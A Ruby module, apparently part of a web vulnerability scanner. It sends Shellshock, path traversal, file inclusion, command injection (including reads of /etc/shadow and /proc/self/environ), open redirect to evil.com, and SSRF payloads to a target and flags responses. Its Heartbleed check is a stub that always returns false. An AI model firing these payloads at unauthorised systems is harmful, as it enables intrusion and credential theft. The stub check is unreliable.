require 'uri'
require 'net/http'
require 'openssl'
require_relative '../utils/network'
require_relative '../utils/colorize'

class VulnerabilityScanning
  def self.check_heartbleed(host)
    begin
      uri = URI("https://#{host}")
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
      false
    rescue
      false
    end
  end

  def self.check_shellshock(host)
    begin
      uri = URI("http://#{host}/cgi-bin/test.cgi")
      response = Network.http_request(uri.to_s, :get, { 'User-Agent' => "() { :; }; echo vulnerable" })
      return false unless response
      response.body.include?("vulnerable")
    rescue
      false
    end
  end

  def self.check_directory_traversal(url)
    payloads = ["../", "..\\", "../../", "..%2F", "%2e%2e%2f", "....//", "....\\\\"]
    vulnerable = false
    
    payloads.each do |payload|
      begin
        test_url = "#{url}/#{payload}etc/passwd"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.include?("root:") || response.body.include?("bin/bash")
          puts Colorize.red("Possible Directory Traversal vulnerability!")
          puts Colorize.yellow("Payload: #{payload}")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.check_file_inclusion(url)
    payloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "php://filter/read=string.rot13/resource=index.php",
      "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
    ]
    
    payloads.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&file=#{URI.encode_www_form_component(payload)}" : "#{url}?file=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.include?("root:") || response.body.include?("phpinfo()") || response.body.include?("PHP Version")
          puts Colorize.red("Possible File Inclusion vulnerability!")
          puts Colorize.yellow("Payload: #{payload}")
          return true
        end
      rescue
      end
    end
    
    false
  end

  def self.check_command_injection(url)
    payloads = [
      "; ls",
      "| whoami",
      "& id",
      "`whoami`",
      "$(whoami)",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "& cat /etc/passwd",
      "`cat /etc/passwd`",
      "$(cat /etc/passwd)",
      "; uname -a",
      "| uname -a",
      "& uname -a",
      "`uname -a`",
      "$(uname -a)",
      "; ps aux",
      "| ps aux",
      "& ps aux",
      "`ps aux`",
      "$(ps aux)",
      "; netstat -an",
      "| netstat -an",
      "& netstat -an",
      "`netstat -an`",
      "$(netstat -an)",
      "; ifconfig",
      "| ifconfig",
      "& ifconfig",
      "`ifconfig`",
      "$(ifconfig)",
      "; env",
      "| env",
      "& env",
      "`env`",
      "$(env)",
      "; pwd",
      "| pwd",
      "& pwd",
      "`pwd`",
      "$(pwd)",
      "; ls -la",
      "| ls -la",
      "& ls -la",
      "`ls -la`",
      "$(ls -la)",
      "; cat /etc/shadow",
      "| cat /etc/shadow",
      "& cat /etc/shadow",
      "`cat /etc/shadow`",
      "$(cat /etc/shadow)",
      "; cat /etc/hosts",
      "| cat /etc/hosts",
      "& cat /etc/hosts",
      "`cat /etc/hosts`",
      "$(cat /etc/hosts)",
      "; cat /proc/version",
      "| cat /proc/version",
      "& cat /proc/version",
      "`cat /proc/version`",
      "$(cat /proc/version)",
      "; cat /proc/cpuinfo",
      "| cat /proc/cpuinfo",
      "& cat /proc/cpuinfo",
      "`cat /proc/cpuinfo`",
      "$(cat /proc/cpuinfo)",
      "; cat /proc/meminfo",
      "| cat /proc/meminfo",
      "& cat /proc/meminfo",
      "`cat /proc/meminfo`",
      "$(cat /proc/meminfo)",
      "; cat /proc/mounts",
      "| cat /proc/mounts",
      "& cat /proc/mounts",
      "`cat /proc/mounts`",
      "$(cat /proc/mounts)",
      "; cat /proc/net/tcp",
      "| cat /proc/net/tcp",
      "& cat /proc/net/tcp",
      "`cat /proc/net/tcp`",
      "$(cat /proc/net/tcp)",
      "; cat /proc/net/udp",
      "| cat /proc/net/udp",
      "& cat /proc/net/udp",
      "`cat /proc/net/udp`",
      "$(cat /proc/net/udp)",
      "; cat /proc/self/environ",
      "| cat /proc/self/environ",
      "& cat /proc/self/environ",
      "`cat /proc/self/environ`",
      "$(cat /proc/self/environ)",
      "; cat /proc/self/cmdline",
      "| cat /proc/self/cmdline",
      "& cat /proc/self/cmdline",
      "`cat /proc/self/cmdline`",
      "$(cat /proc/self/cmdline)",
      "; cat /proc/self/status",
      "| cat /proc/self/status",
      "& cat /proc/self/status",
      "`cat /proc/self/status`",
      "$(cat /proc/self/status)",
      "; cat /proc/self/maps",
      "| cat /proc/self/maps",
      "& cat /proc/self/maps",
      "`cat /proc/self/maps`",
      "$(cat /proc/self/maps)",
      "; cat /proc/self/stat",
      "| cat /proc/self/stat",
      "& cat /proc/self/stat",
      "`cat /proc/self/stat`",
      "$(cat /proc/self/stat)",
      "; cat /proc/self/statm",
      "| cat /proc/self/statm",
      "& cat /proc/self/statm",
      "`cat /proc/self/statm`",
      "$(cat /proc/self/statm)",
      "; cat /proc/self/fd/0",
      "| cat /proc/self/fd/0",
      "& cat /proc/self/fd/0",
      "`cat /proc/self/fd/0`",
      "$(cat /proc/self/fd/0)",
      "; cat /proc/self/fd/1",
      "| cat /proc/self/fd/1",
      "& cat /proc/self/fd/1",
      "`cat /proc/self/fd/1`",
      "$(cat /proc/self/fd/1)",
      "; cat /proc/self/fd/2",
      "| cat /proc/self/fd/2",
      "& cat /proc/self/fd/2",
      "`cat /proc/self/fd/2`",
      "$(cat /proc/self/fd/2)"
    ]
    
    payloads.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&cmd=#{URI.encode_www_form_component(payload)}" : "#{url}?cmd=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.match(/\b(root|bin|daemon|sys)\b/) || response.body.include?("uid=") || response.body.include?("gid=") || response.body.include?("Linux version") || response.body.include?("proc/version") || response.body.include?("proc/self/environ") || response.body.include?("proc/self/cmdline") || response.body.include?("proc/self/status") || response.body.include?("proc/self/maps") || response.body.include?("proc/self/stat") || response.body.include?("proc/self/statm") || response.body.include?("proc/self/fd/0") || response.body.include?("proc/self/fd/1") || response.body.include?("proc/self/fd/2") || response.body.include?("proc/net/tcp") || response.body.include?("proc/net/udp") || response.body.include?("proc/net/raw") || response.body.include?("proc/net/unix") || response.body.include?("proc/mounts") || response.body.include?("proc/cpuinfo") || response.body.include?("proc/meminfo")
          puts Colorize.red("Possible Command Injection vulnerability!")
          puts Colorize.yellow("Payload: #{payload}")
          return true
        end
      rescue
      end
    end
    
    false
  end

  def self.check_open_redirect(url)
    redirect_payloads = [
      "http://evil.com",
      "https://evil.com",
      "//evil.com",
      "///evil.com",
      "javascript:alert('XSS')",
      "data:text/html,<script>alert('XSS')</script>",
      "\\evil.com",
      "/\\evil.com",
      "http://evil.com/",
      "https://evil.com/",
      "//evil.com/",
      "///evil.com/",
      "\\evil.com/",
      "/\\evil.com/"
    ]
    
    redirect_payloads.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&redirect=#{URI.encode_www_form_component(payload)}" : "#{url}?redirect=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.code == "301" || response.code == "302"
          location = response['Location']
          if location && (location.include?("evil.com") || location.include?("javascript:") || location.include?("data:"))
            puts Colorize.red("Open Redirect vulnerability!")
            puts Colorize.yellow("Payload: #{payload}")
            return true
          end
        end
      rescue
      end
    end
    
    false
  end

  def self.check_server_side_request_forgery(url)
    ssrf_payloads = [
      "http://127.0.0.1",
      "http://localhost",
      "http://0.0.0.0",
      "http://[::1]",
      "file:///etc/passwd",
      "gopher://127.0.0.1:80",
      "dict://127.0.0.1:80"
    ]
    
    ssrf_payloads.each do |payload|
      begin
        test_url = url.include?("?") ? "#{url}&url=#{URI.encode_www_form_component(payload)}" : "#{url}?url=#{URI.encode_www_form_component(payload)}"
        response = Network.http_request(test_url)
        next unless response
        
        if response.body.include?("root:") || response.body.include?("127.0.0.1") || response.body.include?("localhost")
          puts Colorize.red("SSRF vulnerability!")
          puts Colorize.yellow("Payload: #{payload}")
          return true
        end
      rescue
      end
    end
    
    false
  end
end

